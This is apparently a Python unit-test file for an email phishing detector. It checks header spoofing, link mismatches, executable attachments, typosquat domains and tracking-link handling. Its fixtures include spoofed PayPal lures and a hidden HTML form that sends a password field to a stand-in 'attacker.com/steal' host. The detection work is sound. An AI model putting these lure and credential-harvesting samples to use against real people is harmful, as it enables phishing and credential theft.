import unittest
import sys
from pathlib import Path

# Ensure CyberShield AI root in sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from ml.email.schema import EmailRecord, AttachmentMetadata
from ml.email.parser import parse_raw_eml, parse_pasted_email
from ml.email.feature_extractor import EmailFeatureExtractor, STRUCTURED_FEATURE_NAMES
from ml.email.header_features import extract_header_features
from ml.email.html_features import extract_html_features
from ml.email.attachment_features import extract_attachment_features
from ml.email.url_aggregator import EmailURLAggregator
from ml.email.xai_engine import EmailXAIEngine
from ml.email.analyzer import EmailSecurityAnalyzer


class TestEmailSecurityEngine(unittest.TestCase):
    """
    Comprehensive test suite validating MIME parsing, feature extractors,
    deterministic XAI evidence, and end-to-end multi-modal inference.
    """

    def setUp(self):
        self.extractor = EmailFeatureExtractor()
        self.xai = EmailXAIEngine()
        self.analyzer = EmailSecurityAnalyzer()

    def test_01_legitimate_email(self):
        raw_eml = """From: colleague@company.com
To: user@company.com
Reply-To: colleague@company.com
Subject: Quarterly team sync agenda
Date: Mon, 21 Sep 2026 10:00:00 +0000
Authentication-Results: spf=pass dkim=pass dmarc=pass

Hi team, here is the discussion agenda for our sync meeting today at 2 PM.
"""
        record = parse_raw_eml(raw_eml)
        self.assertEqual(record.from_domain, "company.com")
        self.assertEqual(record.spf_verdict, "pass")
        self.assertEqual(record.dkim_verdict, "pass")

        result = self.analyzer.analyze_record(record)
        self.assertTrue(result["success"])
        self.assertIn(result["verdict"], ["Safe", "Suspicious"])
        self.assertLess(result["calibrated_probability"], 0.50)

    def test_02_sender_reply_to_mismatch(self):
        raw_eml = """From: service@paypal.com
Reply-To: attacker@hacked-server.ru
Subject: Security Alert: Account Suspended
Authentication-Results: spf=fail

Dear customer, your account has been suspended. Please reply immediately to confirm your identity.
"""
        record = parse_raw_eml(raw_eml)
        self.assertEqual(record.from_domain, "paypal.com")
        self.assertEqual(record.reply_to_domain, "hacked-server.ru")
        
        feats = extract_header_features(record)
        self.assertEqual(feats["from_reply_to_mismatch"], 1)
        self.assertEqual(feats["spf_fail"], 1)

        result = self.analyzer.analyze_record(record)
        self.assertTrue(result["success"])
        evidence_indicators = [e["indicator"] for e in result["evidence"]]
        self.assertIn("Reply Address Differs from Sender Domain", evidence_indicators)

    def test_03_html_anchor_text_href_mismatch(self):
        raw_html = """<html><body>
<p>Please log in to your account: <a href="http://192.168.1.100/login">https://paypal.com/signin</a></p>
</body></html>"""
        record = EmailRecord(
            id="test_anchor_mismatch",
            source_dataset="test",
            label="unknown",
            from_address="alert@bank.com",
            from_domain="bank.com",
            html=raw_html
        )
        html_feats = extract_html_features(record)
        self.assertGreaterEqual(html_feats["html_anchor_href_mismatch_count"], 1)

        result = self.analyzer.analyze_record(record)
        self.assertTrue(result["success"])
        evidence_indicators = [e["indicator"] for e in result["evidence"]]
        self.assertIn("Anchor Text vs Destination Link Mismatch", evidence_indicators)

    def test_04_double_extension_executable_attachment(self):
        record = EmailRecord(
            id="test_attach",
            source_dataset="test",
            label="unknown",
            from_address="billing@invoices.com",
            from_domain="invoices.com",
            attachments=[
                AttachmentMetadata(
                    filename="Invoice_September_2026.pdf.exe",
                    extension=".exe",
                    mime_type="application/octet-stream",
                    size_bytes=102400,
                    is_executable=True,
                    is_double_extension=True
                )
            ]
        )
        attach_feats = extract_attachment_features(record)
        self.assertEqual(attach_feats["has_executable_attachment"], 1)
        self.assertEqual(attach_feats["has_double_extension_attachment"], 1)

        result = self.analyzer.analyze_record(record)
        self.assertTrue(result["success"])
        evidence_indicators = [e["indicator"] for e in result["evidence"]]
        self.assertIn("Double Extension Executable Attachment", evidence_indicators)

    def test_05_url_phishing_ip_and_brand_impersonation(self):
        body = "Urgent: Click here to verify your PayPal wallet: http://paypal.com.verify-user-portal.xyz/login"
        record = parse_pasted_email(sender="security@paypal-update.xyz", body_or_headers=body, subject="Urgent Action")
        self.assertGreaterEqual(len(record.urls), 1)

        result = self.analyzer.analyze_record(record)
        self.assertTrue(result["success"])
        self.assertGreaterEqual(result["risk_score"], 40.0)

    def test_06_empty_and_malformed_email(self):
        # Empty inputs should safely return uncertain / default status without crashing
        record_empty = parse_pasted_email(sender="", body_or_headers="")
        result_empty = self.analyzer.analyze_record(record_empty)
        self.assertTrue(result_empty["success"])
        self.assertIn(result_empty["classification"], ["uncertain", "suspicious", "legitimate"])

    def test_07_multiple_urls_and_attachments(self):
        record = EmailRecord(
            id="multi_test",
            source_dataset="test",
            label="unknown",
            urls=[f"https://sub{i}.domain{i}.com/path" for i in range(15)],
            attachments=[
                AttachmentMetadata(filename=f"doc_{i}.pdf", extension=".pdf", mime_type="application/pdf", size_bytes=5000)
                for i in range(5)
            ]
        )
        vec, struct_dict = self.extractor.extract_vector(record)
        self.assertEqual(len(vec), len(STRUCTURED_FEATURE_NAMES))
        self.assertEqual(struct_dict["attachment_count"], 5)
        self.assertEqual(struct_dict["email_url_count"], 15)

    def test_08_plain_text_only_and_html_only(self):
        plain_rec = parse_pasted_email("user@example.com", "Plain text only body without any html.")
        res_plain = self.analyzer.analyze_record(plain_rec)
        self.assertTrue(res_plain["success"])

        html_rec = EmailRecord(id="html_only", source_dataset="test", label="unknown", html="<p>HTML only paragraph.</p>")
        res_html = self.analyzer.analyze_record(html_rec)
        self.assertTrue(res_html["success"])

    def test_09_creatify_marketing_regression_test(self):
        """TEST 1: Legitimate marketing email with tracking, subdomains, preheaders, SPF/DKIM/DMARC pass."""
        raw_eml = """From: hello@mails.creatify.ai
To: user@example.com
Reply-To: support@creatify.ai
Return-Path: <bounce@envelope.mails.creatify.ai>
Subject: Join our upcoming AI video webinar
Date: Thu, 25 Sep 2026 14:00:00 +0000
Authentication-Results: spf=pass (sender IP is authorized) dkim=pass header.d=mails.creatify.ai dmarc=pass
Received-SPF: pass
Content-Type: text/html; charset=utf-8

<html>
<head>
<style>
.preheader { display:none !important; visibility:hidden; opacity:0; color:transparent; height:0; width:0; font-size:0; }
</style>
</head>
<body>
<span class="preheader" style="display:none;font-size:0px;max-height:0px;">Discover the new Creatify AI features in our live session.</span>
<h1>Creatify AI Product Update &amp; Live Workshop</h1>
<p>Hello Creatify Community,</p>
<p>We are excited to invite you to our upcoming masterclass exploring how top creators and marketing teams scale high-performing video creatives using AI.</p>
<p>In this session, our product design leads will walk through:</p>
<ul>
    <li>Automated batch video rendering from product URLs</li>
    <li>Custom AI avatar scripting and localized voice generation</li>
    <li>Best practices for multi-platform ad creative testing</li>
</ul>
<p>Join us live this Thursday at 10:00 AM PST for Q&amp;A with our product engineering team.</p>
<p><a href="https://link.luma-mail.com/click?url=https%3A%2F%2Fluma.com%2Fcreatify-webinar">Reserve Your Seat on Luma</a></p>
<p>Best regards,<br>The Creatify Team<br>San Francisco, CA</p>
<hr>
<p style="font-size: 11px; color: #888888;">
You received this email because you are registered with Creatify AI.<br>
<a href="https://mails.creatify.ai/preferences">Manage Email Preferences</a> &bull; <a href="https://mails.creatify.ai/unsubscribe">Unsubscribe</a>
</p>
</body>
</html>
"""
        record = parse_raw_eml(raw_eml)
        self.assertEqual(record.from_domain, "mails.creatify.ai")
        self.assertEqual(record.reply_to_domain, "creatify.ai")
        self.assertEqual(record.return_path_domain, "envelope.mails.creatify.ai")
        self.assertEqual(record.spf_verdict, "pass")
        self.assertEqual(record.dkim_verdict, "pass")
        self.assertEqual(record.dmarc_verdict, "pass")

        # 1. Feature checks
        vec, feats = self.extractor.extract_vector(record)
        self.assertEqual(feats["from_reply_to_mismatch"], 0, "Reply-To should be recognized as same organization")
        self.assertEqual(feats["from_return_path_mismatch"], 0, "Return-Path should be recognized as aligned subdomain")
        self.assertEqual(feats["email_has_brand_in_subdomain_url"], 0, "Creatify subdomain should not trigger brand impersonation")
        self.assertEqual(feats["has_hidden_preheader"], 1, "Preheader should be identified")
        self.assertEqual(feats["has_hidden_form"], 0, "No hidden form should be present")

        # 2. End-to-end analyzer check
        result = self.analyzer.analyze_record(record)
        self.assertTrue(result["success"])
        self.assertIn("risk_score", result)
        self.assertIn("calibrated_probability", result)

        # 3. Evidence check: verify all Section 18 TEST 1 requirements
        evidence_indicators = [e["indicator"] for e in result["evidence"]]
        evidence_severities = {e["indicator"]: e["severity"] for e in result["evidence"]}

        # - Return-Path should NOT be classified as suspicious mismatch
        self.assertNotIn("Return-Path Alignment Mismatch", evidence_indicators)
        
        # - Reply-To difference should not automatically be HIGH
        if "Reply Address Differs from Sender Domain" in evidence_severities:
            self.assertNotEqual(evidence_severities["Reply Address Differs from Sender Domain"], "HIGH")

        # - Hidden preheader should not be MEDIUM by itself
        if "Marketing Email Preheader" in evidence_severities:
            self.assertEqual(evidence_severities["Marketing Email Preheader"], "INFO")

        # - Brand keyword should not automatically trigger brand impersonation
        self.assertNotIn("Brand Impersonation in Subdomain", evidence_indicators)
        self.assertNotIn("CRITICAL", [e["severity"] for e in result["evidence"]])

    def test_10_newsletter_subdomain_alignment(self):
        """TEST 2: Legitimate marketing email with related/aligned bounce domain."""
        record = EmailRecord(
            id="test_subdomain_align",
            source_dataset="test",
            label="ham",
            from_address="newsletter@mail.example.com",
            from_domain="mail.example.com",
            return_path="bounce.mail.example.com",
            return_path_domain="bounce.mail.example.com"
        )
        feats = extract_header_features(record)
        self.assertEqual(feats["from_return_path_mismatch"], 0, "Related subdomains must be aligned")

    def test_11_phishing_brand_impersonation_subdomain(self):
        """TEST 3: Phishing lure with brand in third-party subdomain."""
        from ml.email.url_classifier import detect_brand_impersonation
        res = detect_brand_impersonation("http://paypal-login.example.com/update", sender_domain="paypal.com")
        self.assertTrue(res["is_impersonation"])
        self.assertIn(res["severity"], ["HIGH", "CRITICAL"])

    def test_12_typosquatting_detection(self):
        """TEST 4: Typosquatting lookalike domain."""
        from ml.email.url_classifier import detect_brand_impersonation
        res = detect_brand_impersonation("http://paypa1.com/verify")
        self.assertTrue(res["is_impersonation"])
        self.assertEqual(res["brand"], "paypal")

    def test_13_tracking_redirect_not_malicious(self):
        """TEST 5: Legitimate tracking redirect URL classification."""
        from ml.email.url_classifier import classify_single_url, URLCategory
        res = classify_single_url("https://tracking.email-provider.com/click?url=https%3A%2F%2Flegitimate-company.com%2Flanding")
        self.assertEqual(res["category"], URLCategory.REDIRECT)
        self.assertTrue(res["is_tracking"])
        self.assertFalse(res["is_suspicious"])
        self.assertEqual(res["destination_domain"], "legitimate-company.com")

    def test_14_hidden_suspicious_form(self):
        """TEST 6: Suspicious hidden form in HTML."""
        raw_html = """<html><body>
<div style="display:none;">
    <form action="http://attacker.com/steal" method="POST">
        <input type="password" name="pwd">
    </form>
</div>
</body></html>"""
        record = EmailRecord(id="test_hidden_form", source_dataset="test", label="phish", from_address="alert@bank.com", from_domain="bank.com", html=raw_html)
        feats = extract_html_features(record)
        self.assertEqual(feats["has_hidden_form"], 1)

        result = self.analyzer.analyze_record(record)
        indicators = [e["indicator"] for e in result["evidence"] if e["severity"] == "HIGH"]
        self.assertIn("Hidden Form / Credential Inputs", indicators)

    def test_15_hidden_marketing_preheader_info(self):
        """TEST 7: Normal marketing preheader classified as INFO / not malicious."""
        raw_html = """<html><body>
<div style="display:none; font-size:0px; max-height:0px;">Exclusive 20% discount on your next order!</div>
<p>Welcome to our autumn sale.</p>
</body></html>"""
        record = EmailRecord(id="test_preheader", source_dataset="test", label="ham", from_address="sales@store.com", from_domain="store.com", html=raw_html)
        feats = extract_html_features(record)
        self.assertEqual(feats["has_hidden_preheader"], 1)
        self.assertEqual(feats["has_hidden_form"], 0)

        result = self.analyzer.analyze_record(record)
        preheader_ev = [e for e in result["evidence"] if e["indicator"] == "Marketing Email Preheader"]
        self.assertEqual(len(preheader_ev), 1)
        self.assertEqual(preheader_ev[0]["severity"], "INFO")
        self.assertFalse(preheader_ev[0]["risk_factor"])

    def test_16_real_organizational_domain_mismatch(self):
        """TEST 8: Different organizational domain correctly identified as mismatch."""
        record = EmailRecord(
            id="test_real_mismatch",
            source_dataset="test",
            label="phish",
            from_address="ceo@company.com",
            from_domain="company.com",
            return_path="bounces@random-domain.com",
            return_path_domain="random-domain.com"
        )
        feats = extract_header_features(record)
        self.assertEqual(feats["from_return_path_mismatch"], 1, "Unrelated organizational domains must be flagged as mismatch")

    def test_17_sender_hosted_marketing_urls_are_classified_before_sender_alignment(self):
        """Sender-owned wrappers must be unwrapped/categorized, not model-scored as direct links."""
        from ml.email.url_classifier import classify_single_url, URLCategory

        sender = "mails.creatify.ai"
        wrapper = classify_single_url(
            "https://links.creatify.ai/c/abc?destination=https%3A%2F%2Fcreatify.ai%2Fdemo",
            sender_domain=sender,
        )
        unsubscribe = classify_single_url(
            "https://mails.creatify.ai/unsubscribe?token=long-opaque-token",
            sender_domain=sender,
        )
        open_pixel = classify_single_url(
            "https://mails.creatify.ai/open?token=opaque&recipient_id=123",
            sender_domain=sender,
        )

        self.assertEqual(wrapper["category"], URLCategory.REDIRECT)
        self.assertEqual(wrapper["destination_domain"], "creatify.ai")
        self.assertEqual(unsubscribe["category"], URLCategory.UNSUBSCRIBE)
        self.assertEqual(open_pixel["category"], URLCategory.TRACKING)

    def test_18_context_caps_benign_wrapper_but_not_a_malicious_destination(self):
        """A high lexical score alone never makes benign marketing infrastructure malicious."""
        from ml.email.url_classifier import (
            classify_single_url, compute_contextual_url_risk, detect_brand_impersonation,
        )
        from ml.features.url_features import extract_url_features

        benign = classify_single_url(
            "https://links.creatify.ai/c/abc?destination=https%3A%2F%2Fcreatify.ai%2Fdemo",
            sender_domain="mails.creatify.ai",
        )
        benign_destination = benign["destination_url"]
        benign_risk, _ = compute_contextual_url_risk(
            benign,
            detect_brand_impersonation(benign_destination, "mails.creatify.ai"),
            extract_url_features(benign_destination),
            raw_model_risk=0.92,
            sender_org="creatify.ai",
        )
        self.assertEqual(benign_risk, 0.05)

        malicious = classify_single_url(
            "https://links.creatify.ai/c/abc?destination=https%3A%2F%2Fpaypal.security-portal.xyz%2Flogin",
            sender_domain="mails.creatify.ai",
        )
        malicious_destination = malicious["destination_url"]
        malicious_risk, _ = compute_contextual_url_risk(
            malicious,
            detect_brand_impersonation(malicious_destination, "mails.creatify.ai"),
            extract_url_features(malicious_destination),
            raw_model_risk=0.92,
            sender_org="creatify.ai",
        )
        self.assertGreaterEqual(malicious_risk, 0.90)

    def test_19_parser_preserves_url_occurrences_separately_from_unique_urls(self):
        record = parse_pasted_email(
            "newsletter@example.com",
            "https://example.com/promo https://example.com/promo",
        )
        self.assertEqual(record.urls, ["https://example.com/promo"])
        self.assertEqual(record.url_occurrences, ["https://example.com/promo", "https://example.com/promo"])

    def test_20_tracking_wrapper_scores_both_sides_without_promoting_token_entropy(self):
        """Vialoops-style wrappers are safe only when their decoded destination is safe."""
        class StubURLModel:
            def predict_single(self, features):
                if features.get("suspicious_keywords_count", 0):
                    return 0.90
                return 0.92 if features.get("url_length", 0) > 70 else 0.10

        aggregator = EmailURLAggregator()
        aggregator.url_model = StubURLModel()
        good_wrapper = "https://c.vialoops.com/CL0/https:%2F%2Fluma.com%2Fw19eqauk/opaque-tracking-token"
        evil_wrapper = "https://c.vialoops.com/CL0/https:%2F%2Fevil-example.com%2Flogin/opaque-tracking-token"
        record = EmailRecord(
            id="vialoops-context",
            source_dataset="test",
            label="unknown",
            from_domain="mails.creatify.ai",
            urls=[good_wrapper, evil_wrapper],
            url_occurrences=[good_wrapper, good_wrapper, evil_wrapper],
        )

        result = aggregator.analyze_urls(record)
        good, evil = result["classified_urls"]
        self.assertEqual(good["category"], "REDIRECT")
        self.assertEqual(good["destination_domain"], "luma.com")
        self.assertEqual(good["wrapper_risk"], 0.92)
        self.assertEqual(good["destination_risk"], 0.10)
        self.assertEqual(good["final_classification"], "SAFE")
        self.assertEqual(good["occurrence_count"], 2)
        self.assertEqual(evil["destination_domain"], "evil-example.com")
        self.assertEqual(evil["final_classification"], "MALICIOUS")
        self.assertEqual(result["url_metrics"]["malicious_urls"], 1)


if __name__ == "__main__":
    unittest.main()
